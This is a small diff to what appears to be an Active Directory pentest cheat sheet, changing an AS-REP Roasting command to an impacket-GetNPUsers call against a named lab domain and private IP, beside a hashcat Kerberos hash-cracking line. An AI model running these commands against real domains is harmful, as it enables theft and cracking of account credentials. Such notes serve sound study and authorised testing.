@@ -220,7 +220,7 @@ hashcat -m 13100 hashes.txt wordlist.txt
 ## 🟠 2. AS-REP Roasting
 
 ```bash
-GetNPUsers.py domain/ -usersfile users.txt -dc-ip <DC-IP>
+impacket-GetNPUsers canozkan.local/ -dc-ip 192.168.56.108 -usersfile users.txt
 ```
 
 ---
